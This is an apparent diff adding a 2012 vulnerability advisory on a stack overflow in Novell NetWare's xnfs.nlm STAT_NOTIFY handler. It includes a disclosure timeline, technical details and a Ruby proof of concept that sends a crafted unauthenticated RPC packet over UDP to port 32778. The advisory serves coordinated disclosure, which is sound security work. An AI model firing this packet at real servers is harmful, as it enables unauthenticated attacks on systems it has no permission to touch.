@@ -1,0 +1,124 @@
+#####################################################################################
+
+Application:   Novell Netware XNFS.NLM STAT Notify Remote Code Execution Vulnerability
+
+Platforms:   Novell Netware 6.5 SP8
+
+Exploitation:   Remote code execution
+
+CVE Number:  
+
+Novell TID:   5117430
+
+ZDI:   ZDI-12-07
+
+{PRL}:   2012-01
+
+Author:   Francis Provencher (Protek Research Lab's)
+
+Website:   http://www.protekresearchlab.com/
+
+Twitter:   @ProtekResearch
+
+
+#####################################################################################
+
+1) Introduction
+2) Timeline
+3) Technical details
+4) PoC
+
+
+#####################################################################################
+
+===============
+1) Introduction
+===============
+
+Novell, Inc. is a global software and services company based in Waltham, Massachusetts.
+The company specializes in enterprise operating systems, such as SUSE Linux Enterprise
+and Novell NetWare; identity, security, and systems management solutions; and
+collaboration solutions, such as Novell Groupwise and Novell Pulse.
+
+Novell was instrumental in making the Utah Valley a focus for technology and software
+development. Novell technology contributed to the emergence of local area networks,
+which displaced the dominant mainframe computing model and changed computing worldwide.
+Today, a primary focus of the company is on developing open source software for
+enterprise clients.
+
+(http://en.wikipedia.org/wiki/Novell)
+
+#####################################################################################
+
+============================
+2) Timeline
+============================
+
+2011-05-05 - Vulnerability reported to vendor
+2012-01-05 - Coordinated public release of advisory
+
+#####################################################################################
+
+============================
+3) Technical details
+============================
+
+This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Novell Netware.
+
+Authentication is not required to exploit this vulnerability. The flaw exists within the xnfs.nlm component which
+
+is used when handling NFS RPC requests. This process listens on UDP and TCP port 32778. When decoding the
+
+xdr encoded data from an STAT_NOTIFY procedure request the process uses the user supplied length as the
+
+bounds for its copy to a stack buffer. A remote attacker can exploit this vulnerability to execute arbitrary code
+
+under the context of the system.
+
+
+#####################################################################################
+
+===========
+4) The Code
+===========
+
+#!/usr/bin/ruby
+
+require 'socket'
+
+rpc_server = (ARGV[0])
+target_port = (ARGV[1] || 32778)
+
+#RPC/Portmap packet
+beepbeep=
+"\x1c\xd1\xef\xab"  + # XID
+"\x00\x00\x00\x00" + # Message Type: Call (0)
+"\x00\x00\x00\x02" + # RPC Version: 2
+"\x00\x01\x86\xb8" + # Program: 100024 
+"\x00\x00\x00\x01" + # Program Version: 1
+"\x00\x00\x00\x06" + # Procedure: Notify 
+
+"\x00\x00\x00\x01\x00\x00\x00\x18\x09\x27\x4a\x76\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00" +
+
+"\x00\x00\x00\x00\x00\x00\x00\x00" + # Verifier NULL
+
+
+
+"\x41\x41\x41\x41"
+
+
+
+puts "[+]Sending UDP Packet...\n"
+puts "[+] beep beep\n"
+puts "[+]No, it's not the road runner\n"
+
+
+if (!(rpc_server && target_port))
+    puts "Usage: PRL-2012-01.rb host port (default port: 32778)\n"
+    exit
+else
+    
+    sock = UDPSocket.open
+    sock.connect(rpc_server, target_port.to_i)
+    sock.send(beepbeep, 0)
+end
